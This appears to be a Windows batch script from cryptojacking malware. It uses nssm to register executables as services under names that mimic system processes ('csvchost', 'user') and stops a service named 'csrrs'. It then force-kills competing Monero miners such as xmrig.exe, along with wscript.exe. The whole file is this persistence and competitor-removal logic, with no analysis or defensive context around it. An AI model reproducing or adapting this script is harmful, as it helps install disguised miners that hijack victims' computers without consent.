%~dp0\nssm.exe stop csvchost
%~dp0\nssm.exe stop user
%~dp0\nssm.exe stop csrrs
%~dp0\nssm.exe  remove user confirm
%~dp0\nssm.exe  remove csvchost confirm
%~dp0\nssm.exe install user user.exe
%~dp0\nssm.exe start user
%~dp0\nssm.exe install csvchost csvchost.exe
%~dp0\nssm.exe start csvchost
taskkill /f /im xmrig.exe
taskkill /f /im xmr.exe
taskkill /f /im wscript.exe
taskkill /f /im xmrzig.exe

